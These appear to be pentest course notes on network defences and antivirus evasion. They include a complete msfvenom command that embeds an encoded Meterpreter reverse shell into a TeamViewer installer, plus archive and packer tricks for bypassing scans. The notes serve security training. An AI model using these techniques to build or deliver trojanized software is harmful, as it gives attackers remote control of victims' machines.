## 🧠 Understanding Target Defenses

Before attacking, we must understand how systems are protected.

### 🔹 Two Main Types:

1. **Endpoint Protection**
    
2. **Perimeter Protection**
    

---

## 🖥️ Endpoint Protection

- Protects a **single host/device**
    
- Examples:
    
    - Antivirus
        
    - Antimalware
        
    - Firewall
        
    - Anti-DDoS
        

✔️ Common tools:

- Avast
    
- BitDefender
    
- Malwarebytes
    

👉 Used on:

- PCs
    
- Workstations
    
- Servers
    

---

## 🌐 Perimeter Protection

- Protects **entire network boundary**
    
- Located at:
    
    - Network edge
        

✔️ Controls:

- Incoming/outgoing traffic
    

---

### 🧱 DMZ (De-Militarized Zone)

- Middle layer between:
    
    - Internet (untrusted)
        
    - Internal network (trusted)
        

✔️ Hosts:

- Public-facing servers
    

---

## 🖼️ Network Defense Architecture

![Image](https://www.zenarmor.com/docs/assets/images/3-41a25cc48b21f3ab2f5b901dd6060bcb.png)

![Image](https://images.ctfassets.net/aoyx73g9h2pg/7bzXum9hiGqDz9YLY7szXp/69bf4102c9dbcac3c14c3e4b04c76846/What_is_a_Perimeter_Network-Diagram.jpg)

![Image](https://www.paloaltonetworks.com/content/dam/pan/en_US/images/cyberpedia/firewall-vs-ids-vs-ips/how-firewalls-work.png?imwidth=480)

![Image](https://miro.medium.com/0%2AY6jWAWSnxtrsuDbb.jpg)

✔️ Flow:

- Internet → Firewall → DMZ → Internal Network
    

---

## 📜 Security Policies

- Define:
    
    - What is allowed
        
    - What is denied
        

✔️ Similar to:

- ACL (Access Control Lists)
    

---

### 🔹 Types of Policies

- Network traffic
    
- Application
    
- User access
    
- File management
    
- DDoS protection
    

---

## 🔍 Detection Mechanisms

|Type|Description|
|---|---|
|Signature-based|Matches known attack patterns|
|Heuristic/Anomaly|Detects abnormal behavior|
|Stateful Analysis|Checks protocol deviations|
|SOC Monitoring|Human + automated monitoring|

---

## ⚠️ Signature-Based Detection

- Most AV uses this
    
- Matches:
    
    - Known malware patterns
        

✔️ If match →  
❌ Block + quarantine

---

## 🧬 Evasion Techniques

---

## 🔐 1. Encryption (Meterpreter AES)

- MSF uses:
    
    - AES-encrypted communication
        

✔️ Benefits:

- Evades IDS/IPS network detection
    

---

## 🖥️ 2. In-Memory Execution

- Meterpreter:
    
    - Runs in RAM
        
    - No disk traces
        

✔️ Hard to detect

---

## ⚠️ Problem

- Payload file:
    
    - Can still be detected before execution
        

---

## 🧪 3. Backdoored Executables

### 🔹 Concept

- Embed payload into legitimate file
    

---

### 🖼️ Backdoor Execution Flow

![Image](https://www.offsec.com/_astro/Screen-Shot-2016-04-05-at-12.17.19-PM_Z1rl62C.webp)

![Image](https://www.csk.gov.in/image/other/execution_Vipersoftx.png)

![Image](https://ik.imagekit.io/upgrad1/abroad-images/imageCompo/images/1672819384544_sql_injection_preventionY42FCQ.webp?pr-true=)

![Image](https://www.mdpi.com/applsci/applsci-14-08365/article_deploy/html/images/applsci-14-08365-g004-550.jpg)

---

### 🔹 Example Command

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -i 5 -o backdoor.exe
```

---

### 🔹 Important Flags

- `-x` → template executable
    
- `-k` → keep original functionality
    
- `-e` → encoder
    
- `-i` → iterations
    

✔️ Result:

- Legit app + hidden payload
    

---

## 📦 4. Archiving Technique

- Compress payload into:
    
    - Password-protected archive
        

✔️ AV:

- Cannot scan encrypted archive
    

---

### 🔹 Steps:

1. Create archive
    
2. Add password
    
3. Rename file (remove extension)
    
4. Double archive
    

---

## 🧪 Detection Comparison

### 🖼️ AV Detection Difference

![Image](https://www.researchgate.net/publication/334441622/figure/fig2/AS%3A780042883829762%401562988124889/Detection-Percentage-of-Virus-Total-for-each-payload-category-Blue-indicates-mean-values.ppm)

![Image](https://static.opswat.com/uploads/blog/why-archive-files-are-the-1-choice-for-cyberattacks-01.jpeg)

![Image|1287](https://www.researchgate.net/publication/346374643/figure/fig3/AS%3A11431281081051636%401661499133722/An-example-of-virus-total-scan-results.ppm)

![Image|1287](https://www.researchgate.net/publication/354477993/figure/fig3/AS%3A1068049230737408%401631654188242/The-results-of-virustotal-scanning-before-and-after-embedding-the-ransomware-APK-file-a.ppm)

✔️ Example:

- Raw payload → detected
    
- Archived payload → 0 detections
    

---

## 📦 5. Packers

- Compress executable + payload
    

✔️ Adds:

- Obfuscation
    
- Encryption
    

---

### 🔹 Popular Packers:

- UPX
    
- MPRESS
    
- Themida
    
- Enigma Protector
    

---

## 🧠 6. Exploit Code Obfuscation

- Avoid:
    
    - Predictable patterns
        
    - NOP sleds
        

✔️ Use:

- Randomization
    
- Offset variation
    

---

### 🔹 Example:

```ruby
'Targets' =>
[
 [ 'Windows', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
]
```

---

## ⚠️ Important Notes (Keep These)

✔️ Encoding alone is NOT enough

✔️ Modern detection uses:

- Behavior analysis
    
- Machine learning
    

✔️ Best evasion = combination of:

- Encryption
    
- Obfuscation
    
- Delivery techniques
    

✔️ Always:

- Test in lab environment
    

---

## 🧾 Summary

|Technique|Purpose|
|---|---|
|AES Encryption|Hide network traffic|
|In-memory payload|Avoid disk detection|
|Backdoored EXE|Hide payload|
|Archiving|Bypass AV scanning|
|Packers|Obfuscate binaries|
|Randomization|Avoid signatures|

---
